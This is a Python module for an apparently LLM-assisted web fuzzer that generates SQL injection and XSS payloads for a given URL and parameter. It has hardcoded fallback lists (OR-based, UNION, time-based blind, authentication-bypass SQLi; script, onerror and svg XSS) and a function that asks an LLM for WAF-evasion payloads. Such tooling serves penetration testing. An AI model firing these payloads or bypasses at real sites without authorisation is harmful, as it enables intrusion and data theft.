"""
Web Fuzzing Module
Generates and tests payloads for web vulnerabilities (SQL Injection, XSS, RCE)
"""

from typing import List, Dict, Any
from dataclasses import dataclass
import re

from src.utils.llm_client import LLMClient
from src.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class Payload:
    """Web fuzzing payload"""

    type: str  # sqli, xss, rce
    payload: str
    description: str
    severity: str
    test_vector: str


@dataclass
class VulnReport:
    """Vulnerability report"""

    vulnerable: bool
    vulnerability_type: str
    payloads_tested: int
    successful_payloads: List[Payload]
    risk_level: str
    remediation: str


class WebFuzzingModule:
    """
    Web Fuzzing Module for detecting web application vulnerabilities
    Based on GPTFuzzer approach from the paper
    """

    def __init__(self):
        """Initialize web fuzzing module"""
        self.llm_client = LLMClient()
        logger.info("Web Fuzzing Module initialized")

    def generate_sqli_payloads(
        self, target_url: str, param_name: str = "id", count: int = 10
    ) -> List[Payload]:
        """
        Generate SQL injection payloads for a target

        Args:
            target_url: Target URL to test
            param_name: Parameter name to inject
            count: Number of payloads to generate

        Returns:
            List[Payload]: Generated SQL injection payloads
        """
        logger.info(f"Generating {count} SQLi payloads for {target_url}")

        system_message = """You are a web security expert specializing in SQL injection attacks.
Generate creative and effective SQL injection payloads for penetration testing.
Consider different database types (MySQL, PostgreSQL, MSSQL, Oracle) and bypass techniques."""

        prompt = f"""Generate {count} SQL injection payloads to test the parameter '{param_name}' in URL: {target_url}

For each payload, provide:
1. The SQL injection payload
2. Brief description of the attack technique
3. Severity (LOW/MEDIUM/HIGH/CRITICAL)
4. Expected behavior if vulnerable

Format as JSON array with fields: payload, description, severity, expected_behavior"""

        try:
            response = self.llm_client.complete_with_json(
                prompt, system_message=system_message
            )

            payloads = []
            if isinstance(response, list):
                payload_list = response
            elif isinstance(response, dict) and "payloads" in response:
                payload_list = response["payloads"]
            else:
                logger.error("Unexpected response format")
                return self._get_default_sqli_payloads()

            for item in payload_list[:count]:
                payload = Payload(
                    type="sqli",
                    payload=item.get("payload", ""),
                    description=item.get("description", ""),
                    severity=item.get("severity", "MEDIUM"),
                    test_vector=f"{target_url}?{param_name}={item.get('payload', '')}",
                )
                payloads.append(payload)

            logger.info(f"Generated {len(payloads)} SQLi payloads")
            return payloads

        except Exception as e:
            logger.error(f"Failed to generate SQLi payloads: {e}")
            return self._get_default_sqli_payloads()

    def _get_default_sqli_payloads(self) -> List[Payload]:
        """Get default SQLi payloads as fallback"""
        default_payloads = [
            ("' OR '1'='1", "Classic OR-based injection", "HIGH"),
            ("' OR '1'='1' --", "OR-based with comment", "HIGH"),
            ("' UNION SELECT NULL--", "UNION-based injection", "CRITICAL"),
            ("1' AND SLEEP(5)--", "Time-based blind injection", "MEDIUM"),
            ("1' AND (SELECT * FROM users)--", "Boolean-based blind", "HIGH"),
            ("admin'--", "Comment-based authentication bypass", "CRITICAL"),
        ]

        return [
            Payload(
                type="sqli",
                payload=p[0],
                description=p[1],
                severity=p[2],
                test_vector=p[0],
            )
            for p in default_payloads
        ]

    def detect_xss_vulnerabilities(
        self, form_data: Dict[str, Any], context: str = "general"
    ) -> VulnReport:
        """
        Detect XSS vulnerabilities in form inputs

        Args:
            form_data: Form data with inputs to test
            context: Context of the form (general, comment, search, etc.)

        Returns:
            VulnReport: Vulnerability report
        """
        logger.info(f"Testing XSS vulnerabilities in context: {context}")

        # Generate XSS payloads
        xss_payloads = self._get_xss_payloads(context)

        system_message = """You are a web security expert analyzing form inputs for XSS vulnerabilities.
Evaluate whether the inputs are properly sanitized and escaped."""

        inputs_str = "\n".join([f"{k}: {v}" for k, v in form_data.items()])

        prompt = f"""Analyze these form inputs for XSS vulnerabilities:

Context: {context}

Form Inputs:
{inputs_str}

Test Payloads:
{', '.join([p.payload for p in xss_payloads[:5]])}

Provide analysis in JSON format:
{{
    "vulnerable": boolean,
    "vulnerability_type": "reflected_xss" | "stored_xss" | "dom_xss" | "none",
    "risk_level": "LOW" | "MEDIUM" | "HIGH" | "CRITICAL",
    "vulnerable_fields": [list of vulnerable field names],
    "remediation": "remediation advice"
}}"""

        try:
            result = self.llm_client.complete_with_json(
                prompt, system_message=system_message
            )

            return VulnReport(
                vulnerable=result.get("vulnerable", False),
                vulnerability_type=result.get("vulnerability_type", "none"),
                payloads_tested=len(xss_payloads),
                successful_payloads=xss_payloads[
                    : len(result.get("vulnerable_fields", []))
                ],
                risk_level=result.get("risk_level", "LOW"),
                remediation=result.get("remediation", ""),
            )

        except Exception as e:
            logger.error(f"XSS detection failed: {e}")
            return VulnReport(
                vulnerable=False,
                vulnerability_type="error",
                payloads_tested=0,
                successful_payloads=[],
                risk_level="UNKNOWN",
                remediation="Error during analysis",
            )

    def _get_xss_payloads(self, context: str) -> List[Payload]:
        """Get XSS test payloads"""
        payloads = [
            ("<script>alert('XSS')</script>", "Basic script injection", "HIGH"),
            ("<img src=x onerror=alert('XSS')>", "Event handler injection", "HIGH"),
            (
                "<svg/onload=alert('XSS')>",
                "SVG-based XSS",
                "HIGH",
            ),
            ("'><script>alert(String.fromCharCode(88,83,83))</script>", "Encoded XSS", "MEDIUM"),
            ("<iframe src='javascript:alert(1)'>", "Iframe-based XSS", "HIGH"),
            ("javascript:alert('XSS')", "JavaScript protocol", "MEDIUM"),
        ]

        return [
            Payload(
                type="xss",
                payload=p[0],
                description=p[1],
                severity=p[2],
                test_vector=p[0],
            )
            for p in payloads
        ]

    def test_waf_bypass(
        self, waf_type: str, attack_type: str = "sqli"
    ) -> Dict[str, Any]:
        """
        Generate payloads to bypass WAF (Web Application Firewall)

        Args:
            waf_type: Type of WAF (ModSecurity, Cloudflare, AWS WAF, etc.)
            attack_type: Type of attack to bypass (sqli, xss, rce)

        Returns:
            Dict: Bypass test results
        """
        logger.info(f"Generating WAF bypass payloads for {waf_type}")

        system_message = f"""You are a penetration testing expert specializing in WAF bypass techniques.
Generate creative payloads to bypass {waf_type} for {attack_type} attacks.
Use encoding, obfuscation, and evasion techniques."""

        prompt = f"""Generate 5 advanced {attack_type} payloads designed to bypass {waf_type} WAF.

Use techniques like:
- Character encoding (URL, Unicode, Hex)
- Case manipulation
- Comment insertion
- Alternative syntax
- Protocol confusion

Provide in JSON format:
{{
    "payloads": [
        {{
            "payload": "actual payload",
            "technique": "bypass technique used",
            "explanation": "why this might bypass the WAF"
        }}
    ]
}}"""

        try:
            result = self.llm_client.complete_with_json(
                prompt, system_message=system_message
            )

            return {
                "waf_type": waf_type,
                "attack_type": attack_type,
                "bypass_payloads": result.get("payloads", []),
                "total_generated": len(result.get("payloads", [])),
            }

        except Exception as e:
            logger.error(f"WAF bypass generation failed: {e}")
            return {
                "waf_type": waf_type,
                "attack_type": attack_type,
                "bypass_payloads": [],
                "error": str(e),
            }

    def analyze_injection_point(
        self, url: str, parameters: Dict[str, str]
    ) -> Dict[str, Any]:
        """
        Analyze URL and parameters for potential injection points

        Args:
            url: Target URL
            parameters: URL/form parameters

        Returns:
            Dict: Analysis of injection points
        """
        logger.info(f"Analyzing injection points for {url}")

        system_message = """You are a web security expert analyzing injection points.
Identify which parameters are most likely to be vulnerable based on their names and contexts."""

        params_str = "\n".join([f"{k} = {v}" for k, v in parameters.items()])

        prompt = f"""Analyze this URL and its parameters for potential injection vulnerabilities:

URL: {url}

Parameters:
{params_str}

For each parameter, assess:
1. Likelihood of SQL injection vulnerability
2. Likelihood of XSS vulnerability
3. Likelihood of command injection
4. Risk priority (1-10)
5. Recommended testing approach

Respond in JSON format with an array of parameter analyses."""

        try:
            result = self.llm_client.complete_with_json(
                prompt, system_message=system_message
            )

            return {
                "url": url,
                "total_parameters": len(parameters),
                "analysis": result,
                "high_risk_params": [
                    p for p in result if isinstance(p, dict) and p.get("risk_priority", 0) > 7
                ],
            }

        except Exception as e:
            logger.error(f"Injection point analysis failed: {e}")
            return {"url": url, "error": str(e)}


# Example usage
if __name__ == "__main__":
    fuzzer = WebFuzzingModule()

    # Test SQLi payload generation
    print("=" * 50)
    print("SQL Injection Payload Generation")
    print("=" * 50)
    sqli_payloads = fuzzer.generate_sqli_payloads(
        "http://example.com/user.php", "id", count=5
    )
    for i, payload in enumerate(sqli_payloads, 1):
        print(f"\n{i}. {payload.description}")
        print(f"   Payload: {payload.payload}")
        print(f"   Severity: {payload.severity}")

    # Test XSS detection
    print("\n" + "=" * 50)
    print("XSS Vulnerability Detection")
    print("=" * 50)
    form_data = {"username": "<script>alert('test')</script>", "comment": "Hello world"}
    xss_report = fuzzer.detect_xss_vulnerabilities(form_data, context="comment")
    print(f"Vulnerable: {xss_report.vulnerable}")
    print(f"Type: {xss_report.vulnerability_type}")
    print(f"Risk Level: {xss_report.risk_level}")

    # Test WAF bypass
    print("\n" + "=" * 50)
    print("WAF Bypass Payload Generation")
    print("=" * 50)
    waf_bypass = fuzzer.test_waf_bypass("ModSecurity", "sqli")
    print(f"Generated {len(waf_bypass.get('bypass_payloads', []))} bypass payloads")
